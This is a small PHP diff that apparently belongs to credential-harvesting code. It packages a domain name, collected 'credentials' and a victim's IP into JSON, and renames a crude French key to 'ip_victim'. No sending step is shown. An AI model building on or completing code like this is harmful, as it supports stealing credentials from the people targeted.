@@ -27,7 +27,7 @@ if ($_SERVER["REQUEST_METHOD"]==='GET'){
 $data = json_encode([
     'domain_name' => $DOMAIN_NAME,
     'credentials' => $keys,
-    'ip_de_la_grosse_victime' => $ip_vicos
+    'ip_victim' => $ip_vicos
 ]);
 
 
